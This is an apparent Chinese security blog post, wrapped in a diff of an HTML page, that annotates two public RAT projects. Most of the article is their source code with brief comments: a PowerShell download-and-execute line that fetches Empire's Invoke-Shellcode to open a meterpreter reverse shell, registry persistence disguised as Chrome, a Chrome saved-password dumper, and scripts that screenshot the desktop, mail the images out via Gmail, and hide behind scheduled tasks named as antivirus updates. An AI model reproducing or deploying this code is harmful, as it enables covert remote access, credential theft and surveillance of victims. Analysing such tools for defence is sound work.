@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-transform"/>
+
+
+    <title>
+      
+    [安全工具]Powershell-RAT and Python-Rootkit - B1ueB0ne
+    
+    </title>
+
+
+  <link href="asset/css/style.css" rel="stylesheet" > 
+  <link href="asset/js/xcode.min.css" rel="stylesheet">
+  <script src="asset/js/headroom.js"></script>
+
+  <!-- <link rel="stylesheet" href="http://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="asset/css/font-awesome.css">
+ -->
+
+  <!-- <script src="asset/highlightjs/highlight.pack.js"></script> -->
+  <!-- <link href="asset/highlightjs/styles/solarized_light.css" media="screen, projection" rel="stylesheet" type="text/css"> -->
+  <!-- <script>hljs.initHighlightingOnLoad();</script> -->
+
+
+  </head>
+
+  <!-- 主体开始 -->
+  <!-- <body class="" gtools_scp_screen_capture_injected="true"> -->
+  <!-- 上面为主页白底色版本 -->
+    
+<body class="bg-grey" gtools_scp_screen_capture_injected="true" data-feedly-mini="yes">
+<!-- 上面是主页灰底色版本 -->
+
+<!--[if lt IE 8]>
+<div class="browsehappy" role="dialog">
+    当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/" target="_blank">升级你的浏览器</a>。
+</div>
+<![endif]-->
+<!-- 头部位置 -->
+
+<header id="header" class="header bg-white headroom">
+  <div class="navbar-container"> 
+    <a href="index.html" class="navbar-logo"><img src="asset/img/langu.JPG"> </a>
+    <div class="navbar-menu"> 
+
+        
+        <a href="index.html">Index</a>
+        
+        <a href="archives.html">Archives</a>
+        
+        <a href="about.html">About</a>
+        
+        
+    </div> 
+    <!-- 搜索框体 -->
+    <!--  <div class="navbar-search" onclick="">
+        <span class="icon-search"></span>
+        <form id="search" method="post" action="/" role="search">
+          <span class="search-box">
+            <input type="text" id="input" class="input" name="s" required="true" placeholder="Search..." maxlength="30" autocomplete="off">
+          </span>
+        </form>
+    </div> -->
+
+    <div class="navbar-mobile-menu" onclick=""> 
+      <span class="icon-menu cross"><span class="middle"></span></span> 
+        <ul> 
+          
+          <li>
+          <a href="index.html">Index</a>
+          </li>
+          
+          <li>
+          <a href="archives.html">Archives</a>
+          </li>
+          
+          <li>
+          <a href="about.html">About</a>
+          </li>
+          
+        </ul> 
+    </div> 
+  </div> 
+</header>
+<!-- 头部结束 --> <!-- post 开始 -->
+<div class="bg-white" gtools_scp_screen_capture_injected="true" data-feedly-mini="yes">
+	<article class="main-content page-page" style="max-width: 700px;padding: 110px 25px 20px" itemscope="" itemtype="http://schema.org/Article">
+		<div class="post-header">
+			<!-- title -->
+			<div class="post-header">
+				<h1 class="post-title itemprop="name headline">[安全工具]Powershell-RAT and Python-Rootkit</h1>	
+				<div class="post-data">
+					<time datetime="2018-03-13T22:38:41+08:00" pubdate data-updated="true">2018/03/13</time>
+				</div>
+			</div>
+		</div>
+	<div id="post-content" class="post-content" itemprop="articleBody"> 
+		<p class="post-tags"> 
+		
+		<a href='%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7.html'>安全工具</a>&nbsp;
+		
+		<a href='PYTHON.html'>PYTHON</a>&nbsp;
+		
+		</p>
+	<!-- 正文 -->
+		<p>
+		<p>两款基于Python的可绕过安全检测的RAT，简单分析下代码</p>
+
+<span id="more"></span><!-- more -->
+
+<h3 id="toc_0">0x01 前言</h3>
+
+<p>两款基于Python的可绕过安全检测的RAT，简单分析下代码</p>
+
+<!-- more -->
+
+<p><a href="https://github.com/Viralmaniar/Powershell-RAT">Powershell-RAT</a> <code>Python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment</code></p>
+
+<p><a href="https://github.com/islamTaha12/Python-Rootkit">Python-Rootkit</a> <code>Python Remote Administration Tool (RAT) to gain meterpreter session</code></p>
+
+<p>共同点差不多就是：功能单一、相对隐蔽</p>
+
+<p>被<code>Use your social engineer skills to make him open the file</code>这句话逗笑了，精髓啊</p>
+
+<h3 id="toc_1">0x02 Python-Rootkit</h3>
+
+<p><code>GoogleChromeAutoLaunch.py</code></p>
+
+<pre><code class="language-text">NO_IP_HOST = &#39;googlechromeauto.serveirc.com&#39;
+LHOST = &#39;10.0.0.1&#39;
+LPORT = 4444
+TIME_SLEEP = 10
+#msf反向监听的地址
+
+TEMP_PATH = tempfile.gettempdir()
+REG_PATH = r&quot;Software\Microsoft\Windows\CurrentVersion\Run&quot;
+REG_NAME = &quot;GoogleChromeAutoLaunch_9921366102WEAD21312ESAD31312&quot;
+REG_VALUE = &#39;&quot;&#39; + TEMP_PATH + &#39;\GoogleChromeAutoLaunch.exe&#39; + &#39;&quot;&#39; + &#39; --no-startup-window /prefetch:5&#39;
+
+def set_reg_key_value(REG_PATH, name, value):
+#修改注册表，将GoogleChromeAutoLaunch.exe进行注册伪装
+    try:
+        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,_winreg.KEY_ALL_ACCESS)
+        _winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, value)
+    except WindowsError:
+        pass
+
+def fire():
+    if NO_IP_HOST:
+        # Check if no-ip is online or not
+        get_noip_ip_address()
+
+    if platform.machine().endswith(&#39;32&#39;) or platform.machine().endswith(&#39;86&#39;):
+    #用来判断操作系统位数，是否以“86”或“32”结尾来判断是否是32位
+        try:
+            subprocess.Popen(&quot;powershell -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1&#39;);Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;&quot; % (LHOST,LPORT), shell=True)
+            #核心命令：从github上下载Empire脚本并反弹shell
+        except WindowsError:
+            pass
+    else:
+        try:
+            subprocess.Popen(&quot;C:\Windows\SysWOW64\WindowsPowerShell\/v1.0\powershell.exe -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1&#39;);Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;&quot; % (LHOST,LPORT), shell=True)
+        except WindowsError:
+            pass
+
+def run_after_close():
+    foundIT = False
+    runningProcess = []
+    for item in os.popen(&#39;tasklist&#39;).read().splitlines()[4:]:
+        runningProcess.append(item.split())
+    for item2 in runningProcess:
+        if &quot;powershell.exe&quot; in item2:
+            foundIT = True
+
+    if not foundIT:
+        fire()
+
+
+def get_noip_ip_address():
+    global NO_IP_HOST
+    global LHOST
+    LHOST = socket.gethostbyname(NO_IP_HOST)
+
+def dump_google_password():
+#获取chrome账户密码
+    path = &#39;&#39;
+    try:
+        path = sys.argv[1]
+    except IndexError:
+        for w in os.walk(os.getenv(&#39;USERPROFILE&#39;)):
+            if &#39;Chrome&#39; in w[1]:
+                path = str(w[0]) + &#39;\Chrome\User Data\Default\Login Data&#39;
+
+    # Connect to the Database
+    try:
+        conn = sqlite3.connect(path)
+        cursor = conn.cursor()
+    except Exception:
+        pass
+    else:
+        try:
+            cursor.execute(&#39;SELECT action_url, username_value, password_value FROM logins&#39;)
+        except Exception:
+            pass
+        else:
+            data = cursor.fetchall()
+            GoogleAutoPassPath = TEMP_PATH + &#39;//GoogleAutoPass&#39;
+            passGoogle = open(GoogleAutoPassPath,&#39;w&#39;)
+            for result in data:
+                # Decrypt the Password
+                try:
+                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+                except Exception:
+                    continue
+                if password:
+                    try:
+                        passGoogle.write(&quot;[+] URL: %s \n    Username: %s \n    Password: %s \n&quot; % (result[0], result[1], password))
+                    except Exception:
+                        pass
+            passGoogle.close()
+
+
+# fire the payload
+fire()
+time.sleep(5)
+# set the reg value in run key
+set_reg_key_value(REG_PATH,REG_NAME,REG_VALUE)
+
+# dump google chrome password
+dump_google_password()
+
+# keep firing in case of the connection is loss
+while True:
+    run_after_close()
+    time.sleep(TIME_SLEEP)
+</code></pre>
+
+<p>把<code>dump_google_password</code>单独取出来测试了下，效果不理想</p>
+
+<pre><code class="language-text">import tempfile
+import os
+import sqlite3
+import win32crypt
+import sys
+
+TEMP_PATH = tempfile.gettempdir()
+
+def dump_google_password():
+    path = &#39;E:\LoginData&#39;
+    conn = sqlite3.connect(path)
+    cursor = conn.cursor()
+    cursor.execute(&#39;SELECT action_url, username_value, password_value FROM logins&#39;)
+    data = cursor.fetchall()
+    GoogleAutoPassPath = TEMP_PATH + &#39;//GoogleAutoPass&#39;
+    passGoogle = open(GoogleAutoPassPath,&#39;w&#39;)
+    for result in data:
+        try:
+            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)
+        except Exception:
+            continue
+        if password:
+            try:
+                passGoogle.write(&quot;[+] URL: %s \n    Username: %s \n    Password: %s \n&quot; % (result[0], result[1], password))
+            except Exception:
+                pass
+dump_google_password()
+</code></pre>
+
+<h3 id="toc_2">0x03 Python-RAT</h3>
+
+<p>可以说是个很简陋的RAT了，主要功能就是“截屏并发送邮件”</p>
+
+<p><code>PowershellRAT.py</code></p>
+
+<p>这个文件主要是用来整合那些功能的</p>
+
+<pre><code class="language-text">
+def cmd_exectionPolicy():
+
+    process=subprocess.Popen([&quot;powershell&quot;,&quot;Set-ExecutionPolicy Unrestricted&quot;], shell=False);
+    
+    #windows默认不允许任何脚本运行，使用这个命令让PowerShell运行在无限制的环境之下    
+    #Restricted——默认的设置， 不允许任何script运行
+    #AllSigned——只能运行经过数字证书签名的script
+    #RemoteSigned——运行本地的script不需要数字签名，但是运行从网络上下载的script就必须要有数字签名
+    #Unrestricted——允许所有的script运行
+    #在win7下，必须使用管理员的权限启动命令命令行，否则会报“Set-ExecutionPolicy : 对注册表项“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell”的访问被拒绝”错误
+    
+    result=process.communicate()[0]
+    print(result)
+    print (&quot;Execution Policy is now set to unrestricted...&quot;)
+    
+def cmd_takeScreenshot():
+
+    process=subprocess.Popen([&quot;powershell&quot;,&quot;Shoot.ps1&quot;], shell=False);
+    #截屏功能
+    result1=process.communicate()[0]
+    print(result1)
+    print (&quot;ScreenShot taken successfully...&quot;)
+
+def cmd_ScreenShotTaskScheduler():
+
+    process=subprocess.Popen([&quot;powershell&quot;,&quot;schtasks /create /sc minute /mo 1 /tn MicrosoftAntiVirusCriticalUpdatesCore /tr C:\Python36\Shoot.vbs&quot;], shell=False);
+    #创建截屏计划任务并命名为MicrosoftAntiVirusCriticalUpdatesCore
+    result2=process.communicate()[0]
+    print(result2)
+    print (&quot;Task scheduled successfully...&quot;)
+
+def cmd_sendMail():
+    
+    process=subprocess.Popen([&quot;powershell&quot;,&quot;Mail.ps1&quot;], shell=False);
+    #邮件发送功能
+    result3=process.communicate()[0]
+    print(result3)
+    
+
+def cmd_MailTaskScheduler():
+    
+    process=subprocess.Popen([&quot;powershell&quot;,&quot;schtasks /create /sc minute /mo 5 /tn MicrosoftAntiVirusCriticalUpdatesUA /tr C:\Python36\Mail.vbs&quot;], shell=False);
+    #创建邮件计划任务并命名为MicrosoftAntiVirusCriticalUpdatesUA
+    result4=process.communicate()[0]
+    print(result4)
+    print (&quot;Task for data ex-filtration scheduled successfully...&quot;)
+    
+def cmd_deleteScreenShot():
+    
+    process=subprocess.Popen([&quot;powershell&quot;,&quot;Remove-Item $env:USERPROFILE\Documents\ScreenShot\*.*&quot;], shell=False);
+    #删除截屏文件
+    result5=process.communicate()[0]
+    print(result5)
+    print (&quot;All files deleted successfully...&quot;)
+    
+def cmd_deleteTaskScheduler():
+    
+    process=subprocess.Popen([&quot;powershell&quot;,&quot;schtasks /create /sc minute /mo 12 /tn MicrosoftAntiVirusCriticalUpdatesDF /tr C:\Python36\delScreenShot.vbs&quot;], shell=False);
+    #创建删除截屏文件计划任务并命名为MicrosoftAntiVirusCriticalUpdatesDF
+
+    result6=process.communicate()[0]
+    print(result6)
+    print (&quot;Task for deleting data scheduled successfully...&quot;)
+    
+def cmd_HailMary():
+    cmd_ScreenShotTaskScheduler()
+    cmd_MailTaskScheduler()
+    cmd_deleteTaskScheduler()
+    print (&quot;Backdoor successful...&quot;)
+    #执行上边三个计划任务
+</code></pre>
+
+<p><code>Shoot.ps1</code></p>
+
+<pre><code class="language-text">$OutPath = &quot;$env:USERPROFILE\Documents\ScreenShot&quot;
+if (-not (Test-Path $OutPath))
+        {
+            New-Item $OutPath -ItemType Directory -Force
+        }
+$FileName = &quot;$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png&quot;
+#$File = &quot;$OutPath\$FileName&quot;
+$File = Join-Path $OutPath $fileName
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+# Gather Screen resolution information
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+#用来获取整个虚拟屏幕的矩形
+$Width = $Screen.Width
+$Height = $Screen.Height
+$Left = $Screen.Left
+$Top = $Screen.Top
+#获取到的四边长度
+# Create bitmap using the top-left and bottom-right bounds
+$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+#创建一个Bimap类的实例，并将其缩放为指定的大小
+# Create Graphics object
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+#从指定的bitmap创建新的图像
+# Capture screen
+$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+#进行像素的复制（Performs a bit-block transfer of color data, corresponding to a rectangle of pixels, from the screen to the drawing surface of the Graphics.）
+# Save to file
+$bitmap.Save($File) 
+#Write-Output &quot;Screenshot saved to:&quot;
+Write-Output $File
+</code></pre>
+
+<p><code>Mail.ps1</code></p>
+
+<pre><code class="language-text">#Connection Details
+$username=&quot;test@gmail.com&quot;
+$password=&quot;xxxxx&quot;
+$smtpServer = &quot;smtp.gmail.com&quot;
+$msg = new-object Net.Mail.MailMessage
+#初始化MailMessage的新实例
+
+#SMTP connection
+$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
+#使用配置文件初始化SmtpClient的新实例
+
+#SSL tunnel to communicate   
+$smtp.EnableSsl = $true
+#开启ssl
+
+$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)
+#初始化NetworkCredential的新实例
+
+#From Address
+$msg.From = &quot;test@gmail.com&quot;
+
+#To Address, Copy the below line for multiple recipients
+$msg.To.Add(&quot;test@gmail.com&quot;)
+
+#Message Body
+$msg.Body=&quot;Please See Attached Files&quot;
+
+#Message Subject
+$msg.Subject = &quot;Email with Multiple Attachments&quot;
+
+#your file location
+$files=Get-ChildItem &quot;$env:USERPROFILE\Documents\ScreenShot\&quot;
+
+Foreach($file in $files)
+{
+Write-Host &quot;Attaching File :- &quot; $file
+$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
+#使用指定的流和文件名称
+$msg.Attachments.Add($attachment)
+
+}
+$smtp.Send($msg)
+write-host &quot;    Mail Sent&quot;
+$attachment.Dispose();
+$msg.Dispose();
+</code></pre>
+
+		</p>
+		<!-- 侧边导航条 -->
+		<div id="directory-content" class="directory-content">
+    		<div id="directory" style="margin-left: 50px;margin-top: 120px"></div>
+		</div>
+	<!-- JS -->
+	<script>
+		var postDirectoryBuild = function() {
+		    var postChildren = function children(childNodes, reg) {
+		        var result = [],
+		            isReg = typeof reg === 'object',
+		            isStr = typeof reg === 'string',
+		            node, i, len;
+		        for (i = 0, len = childNodes.length; i < len; i++) {
+		            node = childNodes[i];
+		            if ((node.nodeType === 1 || node.nodeType === 9) &&
+		                (!reg ||
+		                isReg && reg.test(node.tagName.toLowerCase()) ||
+		                isStr && node.tagName.toLowerCase() === reg)) {
+		                result.push(node);
+		            }
+		        }
+		        return result;
+		    },
+		    createPostDirectory = function(article, directory, isDirNum) {
+		        var contentArr = [],
+		            titleId = [],
+		            levelArr, root, level,
+		            currentList, list, li, link, i, len;
+		        levelArr = (function(article, contentArr, titleId) {
+		            var titleElem = postChildren(article.childNodes, /^h\d$/),
+		                levelArr = [],
+		                lastNum = 1,
+		                lastRevNum = 1,
+		                count = 0,
+		                guid = 1,
+		                id = 'directory' + (Math.random() + '').replace(/\D/, ''),
+		                lastRevNum, num, elem;
+		            while (titleElem.length) {
+		                elem = titleElem.shift();
+		                contentArr.push(elem.innerHTML);
+		                num = +elem.tagName.match(/\d/)[0];
+		                if (num > lastNum) {
+		                    levelArr.push(1);
+		                    lastRevNum += 1;
+		                } else if (num === lastRevNum ||
+		                    num > lastRevNum && num <= lastNum) {
+		                    levelArr.push(0);
+		                    lastRevNum = lastRevNum;
+		                } else if (num < lastRevNum) {
+		                    levelArr.push(num - lastRevNum);
+		                    lastRevNum = num;
+		                }
+		                count += levelArr[levelArr.length - 1];
+		                lastNum = num;
+		                elem.id = elem.id || (id + guid++);
+		                titleId.push(elem.id);
+		            }
+		            if (count !== 0 && levelArr[0] === 1) levelArr[0] = 0;
+
+		            return levelArr;
+		        })(article, contentArr, titleId);
+		        currentList = root = document.createElement('ul');
+		        dirNum = [0];
+		        for (i = 0, len = levelArr.length; i < len; i++) {
+		            level = levelArr[i];
+		            if (level === 1) {
+		                list = document.createElement('ul');
+		                if (!currentList.lastElementChild) {
+		                    currentList.appendChild(document.createElement('li'));
+		                }
+		                currentList.lastElementChild.appendChild(list);
+		                currentList = list;
+		                dirNum.push(0);
+		            } else if (level < 0) {
+		                level *= 2;
+		                while (level++) {
+		                    if (level % 2) dirNum.pop();
+		                    currentList = currentList.parentNode;
+		                }
+		            }
+		            dirNum[dirNum.length - 1]++;
+		            li = document.createElement('li');
+		            link = document.createElement('a');
+		            link.href = '#' + titleId[i];
+		            link.innerHTML = !isDirNum ? contentArr[i] :
+		                dirNum.join('.') + ' ' + contentArr[i] ;
+		            li.appendChild(link);
+		            currentList.appendChild(li);
+		        }
+		        directory.appendChild(root);
+		    };
+		    createPostDirectory(document.getElementById('post-content'),document.getElementById('directory'), true);
+		};
+		postDirectoryBuild();
+	</script>	
+	<!-- 版权声明 -->
+		<p class="post-info" style="color: #BCBDB6">
+				本文由 <a style="color: #BCBDB6" href="#">B1ueB0ne
+				</a> 创作，采用 <a style="color: #BCBDB6" href="https://creativecommons.org/licenses/by/4.0/" target="_blank" rel="external nofollow">知识共享署名4.0</a> 国际许可协议进行许可<br>本站文章除注明转载/出处外，均为本站原创或翻译，转载前请务必署名<br>最后编辑时间为: 2018-03-16T22:38:41+08:00
+		</p>
+	<!-- 导航 -->
+			<div id="comments" class="clearfix" style="padding: 0px;">
+				<footer class="post-footer clearfix">	    			
+				    <div class="meta">
+					    
+					    <P style="float: left;">
+					    	<a href="15217907327060.html" 
+					        title="Previous Post: [漏洞分析]再看FastJson Unserialization漏洞">&laquo; [漏洞分析]再看FastJson Unserialization漏洞</a>
+					    </p>
+					    <p style="float:right; ">
+					    	
+					    	
+					        <a href="15207487956667.html" 
+					        title="Next Post: [JAVA安全]Java Web 工程源码安全审计概略">[JAVA安全]Java Web 工程源码安全审计概略 &raquo;</a>
+					    </p> 
+					    
+				    </div>
+			  	</footer>
+	<!-- footer end -->
+			</div>		
+	</div>
+</article>
+			<!-- 评论区 -->
+			<div id="respond-post-269" class="comment-container"> 
+				<div id="comments" class="clearfix">
+
+				<script type="text/javascript" src="/pm/hashover/hashover.js"></script>
+<noscript>You must have JavaScript enabled to use the comments.</noscript>
+
+<!-- 评论区结束 -->
+					<div>
+					
+					</div>
+
+				</div>
+			</div>
+</div>
+<!-- headroom -->
+<script type="text/javascript"> 
+(function() {
+    var header = new Headroom(document.querySelector("#header"), {
+        tolerance: 3,
+        offset : 80,
+        classes: {
+          initial: "animated",
+          pinned: "slideDown",
+          unpinned: "slideUp"
+        }
+    });
+    header.init();
+}());
+</script>  <footer id="footer" class="footer" style="background-color: #030501;color: #FFFFFE;">
+  <div class="footer-meta">
+    <div class="footer-container">
+      <!-- 版权说明 -->
+      <div class="meta-item meta-copyright">
+        <div class="meta-copyright-info">
+          <h2 class="meta-title">INFO</h2>
+          <div class="info-text">  
+              <p>Since 2016 <br>
+              <span class="credit">Hacked by 
+              <a target="_blank" href="https://www.uxss.net/">B1ueB0ne</a> 
+              </span>
+              <p>Theme Design by <a href="https://www.linpx.com/" target="_blank">Chakhsu</a></p>
+              <p>Migrating to Mweb by <a href="http://metaidea.cn">idken</a></p>
+              </p> 
+          </div>                  
+        </div>
+      </div>  
+      <!-- Categories -->
+      <div class="meta-item meta-comments">
+          <h2 class="meta-title">CATEGORIES</h2>  
+             
+            
+            <li>
+            <a href="WEB%E5%AE%89%E5%85%A8.html">WEB安全&nbsp;(8)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="JAVA%E5%AE%89%E5%85%A8.html">JAVA安全&nbsp;(10)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="PYTHON.html">PYTHON&nbsp;(2)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">漏洞分析&nbsp;(12)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+      </div>
+      <!-- 最新文章 -->
+      <div class="meta-item meta-comments">
+          <h2 class="meta-title">RECENT POSTS</h2>
+
+          
+          
+         <li>
+           <a href="15982374410900.html">[胡思乱想]奔涌的后浪与独立思考</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982373638552.html">[胡思乱想]为什么我们会对新事物产生抵触心理</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982371852368.html">[IoT安全]2020 IoT Threat Report (简单解读)</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982371354139.html">[安全建设]应用安全评审中的三个关键节点及抓手实现</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982365857946.html">[JAVA安全]利用CodeQL寻找Java Deserialization Vulnerabilities</a><br>
+         </li>
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+           
+
+      </div>
+  </div>
+</div>
+</footer>
+
+<!--评论变量判断 -->
+      
+<!-- 评论end -->
+<script src="asset/chart/all-min.js"></script><script type="text/javascript">$(function(){    var mwebii=0;    var mwebChartEleId = 'mweb-chart-ele-';    $('pre>code').each(function(){        mwebii++;        var eleiid = mwebChartEleId+mwebii;        if($(this).hasClass('language-sequence')){            var ele = $(this).addClass('nohighlight').parent();            $('<div id="'+eleiid+'"></div>').insertAfter(ele);            ele.hide();            var diagram = Diagram.parse($(this).text());            diagram.drawSVG(eleiid,{theme: 'simple'});        }else if($(this).hasClass('language-flow')){            var ele = $(this).addClass('nohighlight').parent();            $('<div id="'+eleiid+'"></div>').insertAfter(ele);            ele.hide();            var diagram = flowchart.parse($(this).text());            diagram.drawSVG(eleiid);        }    });});</script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS_SVG-full"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({TeX: { equationNumbers: { autoNumber: "AMS" } }});</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?5cedc0509c3675ce7544f6ab75111536";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
